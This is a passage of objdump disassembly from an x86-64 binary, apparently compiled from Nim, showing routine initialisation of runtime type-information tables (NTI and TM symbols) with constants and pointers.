  408943:	c6 05 fe 15 02 00 18 	movb   $0x18,0x215fe(%rip)        # 429f48 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x8>
  40894a:	48 c7 05 cb cd 01 00 	movq   $0x30,0x1cdcb(%rip)        # 425720 <NTI__XEycrCsme5C8CVWAYEcdBQ_>
  408951:	30 00 00 00 
  408955:	c6 05 cc cd 01 00 11 	movb   $0x11,0x1cdcc(%rip)        # 425728 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x8>
  40895c:	48 89 2d cd cd 01 00 	mov    %rbp,0x1cdcd(%rip)        # 425730 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x10>
  408963:	c6 05 56 cf 01 00 01 	movb   $0x1,0x1cf56(%rip)        # 4258c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x120>
  40896a:	48 c7 05 53 cf 01 00 	movq   $0x8,0x1cf53(%rip)        # 4258c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x128>
  408971:	08 00 00 00 
  408975:	4c 89 25 54 cf 01 00 	mov    %r12,0x1cf54(%rip)        # 4258d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x130>
  40897c:	48 c7 05 29 cd 01 00 	movq   $0x0,0x1cd29(%rip)        # 4256b0 <NTI__S9agCYBinaYZnGWcjTdxclg_+0x10>
  408983:	00 00 00 00 
  408987:	48 c7 05 0e cd 01 00 	movq   $0x8,0x1cd0e(%rip)        # 4256a0 <NTI__S9agCYBinaYZnGWcjTdxclg_>
  40898e:	08 00 00 00 
  408992:	66 c7 05 0d cd 01 00 	movw   $0x31d,0x1cd0d(%rip)        # 4256a8 <NTI__S9agCYBinaYZnGWcjTdxclg_+0x8>
  408999:	1d 03 
  40899b:	c6 05 4e cf 01 00 01 	movb   $0x1,0x1cf4e(%rip)        # 4258f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x150>
  4089a2:	48 c7 05 4b cf 01 00 	movq   $0x10,0x1cf4b(%rip)        # 4258f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x158>
  4089a9:	10 00 00 00 
  4089ad:	48 c7 05 58 24 02 00 	movq   $0x0,0x22458(%rip)        # 42ae10 <NTI__77mFvmsOLKik79ci2hXkHEg_+0x10>
  4089b4:	00 00 00 00 
  4089b8:	48 c7 05 3d 24 02 00 	movq   $0x8,0x2243d(%rip)        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  4089bf:	08 00 00 00 
  4089c3:	66 c7 05 3c 24 02 00 	movw   $0x21c,0x2243c(%rip)        # 42ae08 <NTI__77mFvmsOLKik79ci2hXkHEg_+0x8>
  4089ca:	1c 02 
  4089cc:	c6 05 4d cf 01 00 01 	movb   $0x1,0x1cf4d(%rip)        # 425920 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x180>
  4089d3:	48 c7 05 4a cf 01 00 	movq   $0x18,0x1cf4a(%rip)        # 425928 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x188>
  4089da:	18 00 00 00 
  4089de:	48 89 3d 4b cf 01 00 	mov    %rdi,0x1cf4b(%rip)        # 425930 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x190>
  4089e5:	48 89 15 0c cd 01 00 	mov    %rdx,0x1cd0c(%rip)        # 4256f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x18>
  4089ec:	48 83 c2 60          	add    $0x60,%rdx
  4089f0:	48 89 15 49 cc 01 00 	mov    %rdx,0x1cc49(%rip)        # 425640 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587>
  4089f7:	48 8d 15 d0 38 00 00 	lea    0x38d0(%rip),%rdx        # 40c2ce <.rdata+0x2ce>
  4089fe:	48 89 15 c3 cf 01 00 	mov    %rdx,0x1cfc3(%rip)        # 4259c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x228>
  408a05:	48 8d 15 d4 cf 01 00 	lea    0x1cfd4(%rip),%rdx        # 4259e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x240>
  408a0c:	48 89 05 ad cf 01 00 	mov    %rax,0x1cfad(%rip)        # 4259c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x220>
  408a13:	48 89 15 2e cc 01 00 	mov    %rdx,0x1cc2e(%rip)        # 425648 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587+0x8>
  408a1a:	48 8d 15 b6 38 00 00 	lea    0x38b6(%rip),%rdx        # 40c2d7 <.rdata+0x2d7>
  408a21:	48 89 05 f8 cf 01 00 	mov    %rax,0x1cff8(%rip)        # 425a20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x280>
  408a28:	48 8d 05 ad 38 00 00 	lea    0x38ad(%rip),%rax        # 40c2dc <.rdata+0x2dc>
  408a2f:	48 89 15 c2 cf 01 00 	mov    %rdx,0x1cfc2(%rip)        # 4259f8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x258>
  408a36:	48 8d 15 d3 cf 01 00 	lea    0x1cfd3(%rip),%rdx        # 425a10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x270>
  408a3d:	48 89 05 e4 cf 01 00 	mov    %rax,0x1cfe4(%rip)        # 425a28 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x288>
  408a44:	48 8d 05 f5 cb 01 00 	lea    0x1cbf5(%rip),%rax        # 425640 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587>
  408a4b:	48 89 05 56 cf 01 00 	mov    %rax,0x1cf56(%rip)        # 4259a8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x208>
  408a52:	48 8d 82 70 ff ff ff 	lea    -0x90(%rdx),%rax
  408a59:	48 89 05 18 cc 01 00 	mov    %rax,0x1cc18(%rip)        # 425678 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x18>
  408a60:	48 8d 05 f9 cb 01 00 	lea    0x1cbf9(%rip),%rax        # 425660 <NTI__oLyohQ7O2XOvGnflOss8EA_>
  408a67:	48 89 05 a2 cb 01 00 	mov    %rax,0x1cba2(%rip)        # 425610 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x10>
  408a6e:	48 8d 05 bc 8b ff ff 	lea    -0x7444(%rip),%rax        # 401631 <Marker_tySequence__uB9b75OUPRENsBAu4AnoePA>
  408a75:	48 89 05 ac cb 01 00 	mov    %rax,0x1cbac(%rip)        # 425628 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x28>
  408a7c:	48 8d 05 7d cb 01 00 	lea    0x1cb7d(%rip),%rax        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  408a83:	48 89 05 d6 ce 01 00 	mov    %rax,0x1ced6(%rip)        # 425960 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1c0>
  408a8a:	48 8d 05 54 38 00 00 	lea    0x3854(%rip),%rax        # 40c2e5 <.rdata+0x2e5>
  408a91:	48 89 15 b8 cb 01 00 	mov    %rdx,0x1cbb8(%rip)        # 425650 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_5_3.56587+0x10>
  408a98:	48 c7 05 cd cb 01 00 	movq   $0x0,0x1cbcd(%rip)        # 425670 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x10>
  408a9f:	00 00 00 00 
  408aa3:	48 c7 05 b2 cb 01 00 	movq   $0x18,0x1cbb2(%rip)        # 425660 <NTI__oLyohQ7O2XOvGnflOss8EA_>
  408aaa:	18 00 00 00 
  408aae:	66 c7 05 b1 cb 01 00 	movw   $0x312,0x1cbb1(%rip)        # 425668 <NTI__oLyohQ7O2XOvGnflOss8EA_+0x8>
  408ab5:	12 03 
  408ab7:	c6 05 f2 ce 01 00 01 	movb   $0x1,0x1cef2(%rip)        # 4259b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x210>
  408abe:	48 c7 05 ef ce 01 00 	movq   $0x0,0x1ceef(%rip)        # 4259b8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x218>
  408ac5:	00 00 00 00 
  408ac9:	48 c7 05 9c 1d 02 00 	movq   $0x0,0x21d9c(%rip)        # 42a870 <NTI__rR5Bzr1D5krxoo1NcNyeMA_+0x10>
  408ad0:	00 00 00 00 
  408ad4:	48 c7 05 81 1d 02 00 	movq   $0x8,0x21d81(%rip)        # 42a860 <NTI__rR5Bzr1D5krxoo1NcNyeMA_>
  408adb:	08 00 00 00 
  408adf:	66 c7 05 80 1d 02 00 	movw   $0x31f,0x21d80(%rip)        # 42a868 <NTI__rR5Bzr1D5krxoo1NcNyeMA_+0x8>
  408ae6:	1f 03 
  408ae8:	c6 05 f1 ce 01 00 01 	movb   $0x1,0x1cef1(%rip)        # 4259e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x240>
  408aef:	48 c7 05 ee ce 01 00 	movq   $0x8,0x1ceee(%rip)        # 4259e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x248>
  408af6:	08 00 00 00 
  408afa:	4c 89 3d ef ce 01 00 	mov    %r15,0x1ceef(%rip)        # 4259f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x250>
  408b01:	c6 05 08 cf 01 00 01 	movb   $0x1,0x1cf08(%rip)        # 425a10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x270>
  408b08:	48 c7 05 05 cf 01 00 	movq   $0x10,0x1cf05(%rip)        # 425a18 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x278>
  408b0f:	10 00 00 00 
  408b13:	48 c7 05 82 ce 01 00 	movq   $0x3,0x1ce82(%rip)        # 4259a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x200>
  408b1a:	03 00 00 00 
  408b1e:	c6 05 5b ce 01 00 02 	movb   $0x2,0x1ce5b(%rip)        # 425980 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1e0>
  408b25:	48 c7 05 d0 ca 01 00 	movq   $0x8,0x1cad0(%rip)        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  408b2c:	08 00 00 00 
  408b30:	66 c7 05 cf ca 01 00 	movw   $0x218,0x1cacf(%rip)        # 425608 <NTI__uB9b75OUPRENsBAu4AnoePA_+0x8>
  408b37:	18 02 
  408b39:	c6 05 10 ce 01 00 01 	movb   $0x1,0x1ce10(%rip)        # 425950 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b0>
  408b40:	48 c7 05 0d ce 01 00 	movq   $0x20,0x1ce0d(%rip)        # 425958 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b8>
  408b47:	20 00 00 00 
  408b4b:	48 89 05 16 ce 01 00 	mov    %rax,0x1ce16(%rip)        # 425968 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1c8>
  408b52:	48 8d 42 30          	lea    0x30(%rdx),%rax
  408b56:	48 89 05 a3 cb 01 00 	mov    %rax,0x1cba3(%rip)        # 425700 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x20>
  408b5d:	48 8d 05 87 37 00 00 	lea    0x3787(%rip),%rax        # 40c2eb <.rdata+0x2eb>
  408b64:	48 89 05 ed ce 01 00 	mov    %rax,0x1ceed(%rip)        # 425a58 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2b8>
  408b6b:	48 8d 05 6e cb 01 00 	lea    0x1cb6e(%rip),%rax        # 4256e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586>
  408b72:	48 89 05 3f cd 01 00 	mov    %rax,0x1cd3f(%rip)        # 4258b8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x118>
  408b79:	48 8d 82 80 fe ff ff 	lea    -0x180(%rdx),%rax
  408b80:	48 89 05 b1 cb 01 00 	mov    %rax,0x1cbb1(%rip)        # 425738 <NTI__XEycrCsme5C8CVWAYEcdBQ_+0x18>
  408b87:	48 8d 05 ab a6 ff ff 	lea    -0x5955(%rip),%rax        # 403239 <Marker_tyRef__vU9aO9cTqOMn6CBzhV8rX7Sw>
  408b8e:	48 89 05 b3 15 02 00 	mov    %rax,0x215b3(%rip)        # 42a148 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x28>
  408b95:	48 8d 05 d4 ce 01 00 	lea    0x1ced4(%rip),%rax        # 425a70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2d0>
  408b9c:	48 89 05 35 ca 01 00 	mov    %rax,0x1ca35(%rip)        # 4255d8 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x18>
  408ba3:	48 83 c0 30          	add    $0x30,%rax
  408ba7:	48 89 05 ea c9 01 00 	mov    %rax,0x1c9ea(%rip)        # 425598 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x18>
  408bae:	48 8d 05 cb c9 01 00 	lea    0x1c9cb(%rip),%rax        # 425580 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_>
  408bb5:	48 8d 15 04 ca 01 00 	lea    0x1ca04(%rip),%rdx        # 4255c0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_>
  408bbc:	48 89 05 8d c9 01 00 	mov    %rax,0x1c98d(%rip)        # 425550 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x10>
  408bc3:	48 8d 05 69 a7 ff ff 	lea    -0x5897(%rip),%rax        # 403333 <Marker_tyRef__DsOOBcxCUeVlNUDRmn9afcA>
  408bca:	48 89 0d 5f 15 02 00 	mov    %rcx,0x2155f(%rip)        # 42a130 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x10>
  408bd1:	48 89 0d f8 c9 01 00 	mov    %rcx,0x1c9f8(%rip)        # 4255d0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x10>
  408bd8:	48 89 15 b1 c9 01 00 	mov    %rdx,0x1c9b1(%rip)        # 425590 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x10>
  408bdf:	48 89 05 82 c9 01 00 	mov    %rax,0x1c982(%rip)        # 425568 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x28>
  408be6:	48 8d 05 e3 ce 01 00 	lea    0x1cee3(%rip),%rax        # 425ad0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x330>
  408bed:	48 89 15 1c c9 01 00 	mov    %rdx,0x1c91c(%rip)        # 425510 <NTI__XIT9aewsXycM2U5B437NUDA_+0x10>
  408bf4:	c6 05 45 ce 01 00 01 	movb   $0x1,0x1ce45(%rip)        # 425a40 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2a0>
  408bfb:	48 c7 05 42 ce 01 00 	movq   $0x28,0x1ce42(%rip)        # 425a48 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2a8>
  408c02:	28 00 00 00 
  408c06:	4c 89 25 43 ce 01 00 	mov    %r12,0x1ce43(%rip)        # 425a50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2b0>
  408c0d:	48 c7 05 98 cc 01 00 	movq   $0x5,0x1cc98(%rip)        # 4258b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x110>
  408c14:	05 00 00 00 
  408c18:	c6 05 71 cc 01 00 02 	movb   $0x2,0x1cc71(%rip)        # 425890 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xf0>
  408c1f:	48 c7 05 f6 14 02 00 	movq   $0x8,0x214f6(%rip)        # 42a120 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_>
  408c26:	08 00 00 00 
  408c2a:	c6 05 f7 14 02 00 16 	movb   $0x16,0x214f7(%rip)        # 42a128 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_+0x8>
  408c31:	48 c7 05 84 c9 01 00 	movq   $0x30,0x1c984(%rip)        # 4255c0 <NTI__LbeSGvgPzGzXnW9caIkJqMA_>
  408c38:	30 00 00 00 
  408c3c:	c6 05 85 c9 01 00 11 	movb   $0x11,0x1c985(%rip)        # 4255c8 <NTI__LbeSGvgPzGzXnW9caIkJqMA_+0x8>
  408c43:	48 c7 05 42 ce 01 00 	movq   $0x0,0x1ce42(%rip)        # 425a90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2f0>
  408c4a:	00 00 00 00 
  408c4e:	c6 05 1b ce 01 00 02 	movb   $0x2,0x1ce1b(%rip)        # 425a70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x2d0>
  408c55:	48 c7 05 20 c9 01 00 	movq   $0x30,0x1c920(%rip)        # 425580 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_>
  408c5c:	30 00 00 00 
  408c60:	c6 05 21 c9 01 00 11 	movb   $0x11,0x1c921(%rip)        # 425588 <NTI__Wyd9avMRCq0gsOu9adFoIjCA_+0x8>
  408c67:	48 c7 05 4e ce 01 00 	movq   $0x0,0x1ce4e(%rip)        # 425ac0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x320>
  408c6e:	00 00 00 00 
  408c72:	c6 05 27 ce 01 00 02 	movb   $0x2,0x1ce27(%rip)        # 425aa0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x300>
  408c79:	48 c7 05 bc c8 01 00 	movq   $0x8,0x1c8bc(%rip)        # 425540 <NTI__DsOOBcxCUeVlNUDRmn9afcA_>
  408c80:	08 00 00 00 
  408c84:	c6 05 bd c8 01 00 16 	movb   $0x16,0x1c8bd(%rip)        # 425548 <NTI__DsOOBcxCUeVlNUDRmn9afcA_+0x8>
  408c8b:	48 c7 05 6a c8 01 00 	movq   $0x30,0x1c86a(%rip)        # 425500 <NTI__XIT9aewsXycM2U5B437NUDA_>
  408c92:	30 00 00 00 
  408c96:	c6 05 6b c8 01 00 11 	movb   $0x11,0x1c86b(%rip)        # 425508 <NTI__XIT9aewsXycM2U5B437NUDA_+0x8>
  408c9d:	48 c7 05 48 ce 01 00 	movq   $0x0,0x1ce48(%rip)        # 425af0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x350>
  408ca4:	00 00 00 00 
  408ca8:	48 89 0d a1 c7 01 00 	mov    %rcx,0x1c7a1(%rip)        # 425450 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x10>
  408caf:	48 8d 0d 7a ce 01 00 	lea    0x1ce7a(%rip),%rcx        # 425b30 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x390>
  408cb6:	48 89 05 5b c8 01 00 	mov    %rax,0x1c85b(%rip)        # 425518 <NTI__XIT9aewsXycM2U5B437NUDA_+0x18>
  408cbd:	48 8d 05 3c c8 01 00 	lea    0x1c83c(%rip),%rax        # 425500 <NTI__XIT9aewsXycM2U5B437NUDA_>
  408cc4:	48 89 0d 8d c7 01 00 	mov    %rcx,0x1c78d(%rip)        # 425458 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x18>
  408ccb:	48 8d 0d ee c6 01 00 	lea    0x1c6ee(%rip),%rcx        # 4253c0 <NTI__sVg18TP9cLifHyygRe9cro9aA_>
  408cd2:	48 89 05 f7 c7 01 00 	mov    %rax,0x1c7f7(%rip)        # 4254d0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x10>
  408cd9:	48 8d 05 20 ce 01 00 	lea    0x1ce20(%rip),%rax        # 425b00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x360>
  408ce0:	48 89 0d 89 ce 01 00 	mov    %rcx,0x1ce89(%rip)        # 425b70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3d0>
  408ce7:	48 8d 0d 00 36 00 00 	lea    0x3600(%rip),%rcx        # 40c2ee <.rdata+0x2ee>
  408cee:	48 89 05 e3 c7 01 00 	mov    %rax,0x1c7e3(%rip)        # 4254d8 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x18>
  408cf5:	48 8d 05 c4 c7 01 00 	lea    0x1c7c4(%rip),%rax        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  408cfc:	48 89 0d 75 ce 01 00 	mov    %rcx,0x1ce75(%rip)        # 425b78 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3d8>
  408d03:	48 8d 0d 56 ce 01 00 	lea    0x1ce56(%rip),%rcx        # 425b60 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c0>
  408d0a:	48 89 05 7f c7 01 00 	mov    %rax,0x1c77f(%rip)        # 425490 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x10>
  408d11:	48 8d 05 db a5 ff ff 	lea    -0x5a25(%rip),%rax        # 4032f3 <Marker_tyRef__Pjt0MQjoA6TAHAHOFNel9cg>
  408d18:	48 89 0d f9 c6 01 00 	mov    %rcx,0x1c6f9(%rip)        # 425418 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x18>
  408d1f:	48 8d 0d da c6 01 00 	lea    0x1c6da(%rip),%rcx        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  408d26:	48 89 05 7b c7 01 00 	mov    %rax,0x1c77b(%rip)        # 4254a8 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x28>
  408d2d:	48 8d 05 0c c7 01 00 	lea    0x1c70c(%rip),%rax        # 425440 <NTI__qrLSDoe2oBoAqNtJ9badtnA_>
  408d34:	48 89 0d 55 c6 01 00 	mov    %rcx,0x1c655(%rip)        # 425390 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x10>
  408d3b:	48 8d 0d 35 a5 ff ff 	lea    -0x5acb(%rip),%rcx        # 403277 <Marker_tyRef__9clYsYwyjCqe2PFTuCI3Ubg>
  408d42:	48 89 05 c7 c6 01 00 	mov    %rax,0x1c6c7(%rip)        # 425410 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x10>
  408d49:	c6 05 80 cd 01 00 02 	movb   $0x2,0x1cd80(%rip)        # 425ad0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x330>
  408d50:	48 c7 05 65 c7 01 00 	movq   $0x30,0x1c765(%rip)        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  408d57:	30 00 00 00 
  408d5b:	c6 05 66 c7 01 00 11 	movb   $0x11,0x1c766(%rip)        # 4254c8 <NTI__Ss6DFlX5iSZpHRZDmP74bg_+0x8>
  408d62:	48 c7 05 b3 cd 01 00 	movq   $0x0,0x1cdb3(%rip)        # 425b20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x380>
  408d69:	00 00 00 00 
  408d6d:	c6 05 8c cd 01 00 02 	movb   $0x2,0x1cd8c(%rip)        # 425b00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x360>
  408d74:	48 c7 05 01 c7 01 00 	movq   $0x8,0x1c701(%rip)        # 425480 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_>
  408d7b:	08 00 00 00 
  408d7f:	c6 05 02 c7 01 00 16 	movb   $0x16,0x1c702(%rip)        # 425488 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_+0x8>
  408d86:	48 c7 05 af c6 01 00 	movq   $0x30,0x1c6af(%rip)        # 425440 <NTI__qrLSDoe2oBoAqNtJ9badtnA_>
  408d8d:	30 00 00 00 
  408d91:	c6 05 b0 c6 01 00 11 	movb   $0x11,0x1c6b0(%rip)        # 425448 <NTI__qrLSDoe2oBoAqNtJ9badtnA_+0x8>
  408d98:	48 c7 05 ad cd 01 00 	movq   $0x0,0x1cdad(%rip)        # 425b50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3b0>
  408d9f:	00 00 00 00 
  408da3:	c6 05 86 cd 01 00 02 	movb   $0x2,0x1cd86(%rip)        # 425b30 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x390>
  408daa:	48 c7 05 4b c6 01 00 	movq   $0x38,0x1c64b(%rip)        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  408db1:	38 00 00 00 
  408db5:	c6 05 4c c6 01 00 11 	movb   $0x11,0x1c64c(%rip)        # 425408 <NTI__BeJgrOdDsczOwEWOZbRfKA_+0x8>
  408dbc:	48 c7 05 09 c6 01 00 	movq   $0x0,0x1c609(%rip)        # 4253d0 <NTI__sVg18TP9cLifHyygRe9cro9aA_+0x10>
  408dc3:	00 00 00 00 
  408dc7:	48 c7 05 ee c5 01 00 	movq   $0x4,0x1c5ee(%rip)        # 4253c0 <NTI__sVg18TP9cLifHyygRe9cro9aA_>
  408dce:	04 00 00 00 
  408dd2:	66 c7 05 ed c5 01 00 	movw   $0x322,0x1c5ed(%rip)        # 4253c8 <NTI__sVg18TP9cLifHyygRe9cro9aA_+0x8>
  408dd9:	22 03 
  408ddb:	c6 05 7e cd 01 00 01 	movb   $0x1,0x1cd7e(%rip)        # 425b60 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c0>
  408de2:	48 c7 05 7b cd 01 00 	movq   $0x30,0x1cd7b(%rip)        # 425b68 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3c8>
  408de9:	30 00 00 00 
  408ded:	48 c7 05 88 c5 01 00 	movq   $0x8,0x1c588(%rip)        # 425380 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_>
  408df4:	08 00 00 00 
  408df8:	c6 05 89 c5 01 00 16 	movb   $0x16,0x1c589(%rip)        # 425388 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x8>
  408dff:	48 89 0d a2 c5 01 00 	mov    %rcx,0x1c5a2(%rip)        # 4253a8 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_+0x28>
  408e06:	48 8d 0d f3 c4 01 00 	lea    0x1c4f3(%rip),%rcx        # 425300 <NTI__k3HXouOuhqAKq0dx450lXQ_>
  408e0d:	48 89 0d bc c4 01 00 	mov    %rcx,0x1c4bc(%rip)        # 4252d0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x10>
  408e14:	48 8d 0d b9 87 ff ff 	lea    -0x7847(%rip),%rcx        # 4015d4 <Marker_tySequence__6H5Oh5UUvVCLiakt9aTwtUQ>
  408e1b:	48 89 0d c6 c4 01 00 	mov    %rcx,0x1c4c6(%rip)        # 4252e8 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x28>
  408e22:	48 8d 0d 67 cd 01 00 	lea    0x1cd67(%rip),%rcx        # 425b90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3f0>
  408e29:	48 89 0d 68 c4 01 00 	mov    %rcx,0x1c468(%rip)        # 425298 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x18>
  408e30:	48 8d 0d 49 c4 01 00 	lea    0x1c449(%rip),%rcx        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  408e37:	48 89 0d 12 c4 01 00 	mov    %rcx,0x1c412(%rip)        # 425250 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x10>
  408e3e:	48 8d 0d f0 a4 ff ff 	lea    -0x5b10(%rip),%rcx        # 403335 <Marker_tyRef__M8bPR1OE5OXPYGyQdVHfTg>
  408e45:	48 89 05 44 c4 01 00 	mov    %rax,0x1c444(%rip)        # 425290 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x10>
  408e4c:	48 89 0d 15 c4 01 00 	mov    %rcx,0x1c415(%rip)        # 425268 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x28>
  408e53:	48 8d 0d a6 c3 01 00 	lea    0x1c3a6(%rip),%rcx        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  408e5a:	48 89 05 af c3 01 00 	mov    %rax,0x1c3af(%rip)        # 425210 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x10>
  408e61:	4c 89 05 b0 c3 01 00 	mov    %r8,0x1c3b0(%rip)        # 425218 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x18>
  408e68:	48 c7 05 5d 17 02 00 	movq   $0x0,0x2175d(%rip)        # 42a5d0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_+0x10>
  408e6f:	00 00 00 00 
  408e73:	48 c7 05 42 17 02 00 	movq   $0x8,0x21742(%rip)        # 42a5c0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_>
  408e7a:	08 00 00 00 
  408e7e:	66 c7 05 41 17 02 00 	movw   $0x323,0x21741(%rip)        # 42a5c8 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_+0x8>
  408e85:	23 03 
  408e87:	48 c7 05 de 12 02 00 	movq   $0x0,0x212de(%rip)        # 42a170 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_+0x10>
  408e8e:	00 00 00 00 
  408e92:	48 c7 05 c3 12 02 00 	movq   $0x1,0x212c3(%rip)        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  408e99:	01 00 00 00 
  408e9d:	66 c7 05 c2 12 02 00 	movw   $0x301,0x212c2(%rip)        # 42a168 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_+0x8>
  408ea4:	01 03 
  408ea6:	48 c7 05 9f c4 01 00 	movq   $0x0,0x1c49f(%rip)        # 425350 <NTI__kDPg4wXyR8DDyA0MeEjIsw_+0x10>
  408ead:	00 00 00 00 
